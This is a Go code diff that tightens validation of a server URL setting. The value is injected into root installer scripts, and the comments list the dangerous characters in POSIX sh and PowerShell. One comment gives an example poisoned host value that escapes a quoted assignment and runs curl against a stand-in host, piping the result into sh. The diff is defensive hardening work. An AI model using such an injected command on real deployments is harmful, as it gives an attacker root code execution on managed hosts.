@@ -797,16 +797,38 @@ func constructServerURL(protocol, host string, port int) string {
 
 // serverURLSafeChars restricts a server URL to the characters a real one needs.
 //
-// This value is written verbatim into a double-quoted shell assignment in the
-// generated installer and auto-enrolment scripts:
+// Before widening this set, note that the value reaches THREE sinks with three
+// different escaping rules. All are currently safe, but only because the
+// allowlist happens to exclude the metacharacters of all three:
 //
-//	export PATCHMON_URL="<value>"
+//  1. POSIX sh, double-quoted (install.go, auto_enrollment.go):
+//     export PATCHMON_URL="<value>"
+//     Dangerous: " \ ` $
 //
-// and those scripts are documented to be piped into sh as root on every managed
-// host. A double quote, backslash, backtick or $ escapes that assignment, so a
-// settings write turns into root code execution across the fleet. Restricting
-// the character set is the reliable guard; url.Parse alone accepts plenty of
-// strings that are hostile in a shell.
+//  2. PowerShell, double-quoted (install.go, the Windows branch):
+//     $env:PATCHMON_SERVER_URL = "<value>"
+//     Dangerous: $( ) and the BACKTICK, which is PowerShell's escape character
+//     rather than command substitution. Also , and @ carry meaning in
+//     PowerShell argument parsing.
+//
+//  3. POSIX sh, SINGLE-quoted, second order (proxmox_auto_enroll.sh):
+//     pct exec "$vmid" -- sh -c "... curl ... '<value>' && sh installer"
+//     The value is expanded by the outer shell and lands inside single quotes
+//     in a root shell INSIDE the container. Dangerous: the single quote.
+//
+// These scripts are documented to be piped into sh as root on every managed
+// host, so a settings write turning into code execution is a fleet-wide
+// compromise. Restricting the character set is the reliable guard; url.Parse
+// alone accepts plenty of strings that are hostile in a shell.
+//
+// [ and ] ARE permitted, for IPv6 literals. They are glob metacharacters, which
+// only matter in an UNQUOTED expansion, and every expansion of this value in
+// every generated script is quoted. If an unquoted one is ever added, that
+// changes.
+//
+// The trailing `$` is end-of-TEXT in Go's regexp, not PCRE's end-of-line, so a
+// trailing newline is rejected rather than slipping through. That is
+// load-bearing and easy to break by adding (?m).
 var serverURLSafeChars = regexp.MustCompile(`^[A-Za-z0-9._:/\[\]-]+$`)
 
 // serverHostSafeChars covers hostnames, IPv4 literals, and bracketed IPv6.
@@ -833,6 +855,15 @@ func validateServerURL(raw string) error {
 	}
 	if u.Host == "" {
 		return errors.New("server URL must include a host")
+	}
+	// url.Parse does not range-check the port unless it is asked for it, so
+	// http://a.com:99999999999999999999 parses happily. Bound it here to match
+	// validateServerURLParts rather than leaving the two disagreeing.
+	if port := u.Port(); port != "" {
+		n, err := strconv.Atoi(port)
+		if err != nil || n < 1 || n > 65535 {
+			return errors.New("server URL port must be between 1 and 65535")
+		}
 	}
 	return nil
 }
@@ -889,7 +920,26 @@ func applySettingsUpdate(s *models.Settings, req map[string]interface{}, enc *ut
 	// Derive server_url from protocol/host/port when any of those were updated (matches Node backend behavior).
 	// Only derive when server_url was not explicitly sent (explicit URL takes precedence).
 	if !hasExplicitURL && (hasProtocolVal || hasHostVal || hasPortVal) {
-		s.ServerURL = constructServerURL(s.ServerProtocol, s.ServerHost, s.ServerPort)
+		// Validate the DERIVED value, not just the incoming fields.
+		//
+		// validateServerURLParts only inspects the fields present in this
+		// request, but the URL is built from a mix of new and already-stored
+		// values. A request supplying only server_port therefore composed
+		// itself with a stored server_host that this validator never saw:
+		//
+		//   stored host: evil.com";curl http://evil/x|sh;#
+		//   PATCH {"server_port": 443}
+		//   -> http://evil.com";curl http://evil/x|sh;#:443
+		//
+		// which validateServerURL would reject, but was never asked about.
+		// Reachable on any instance whose server_host was poisoned before this
+		// validation existed, or written outside this handler (the
+		// multi-context provisioner writes context databases directly).
+		candidate := constructServerURL(s.ServerProtocol, s.ServerHost, s.ServerPort)
+		if err := validateServerURL(candidate); err != nil {
+			return err
+		}
+		s.ServerURL = candidate
 	}
 	if v, ok := getReqFloat64(req, "update_interval", "updateInterval"); ok {
 		s.UpdateInterval = int(v)
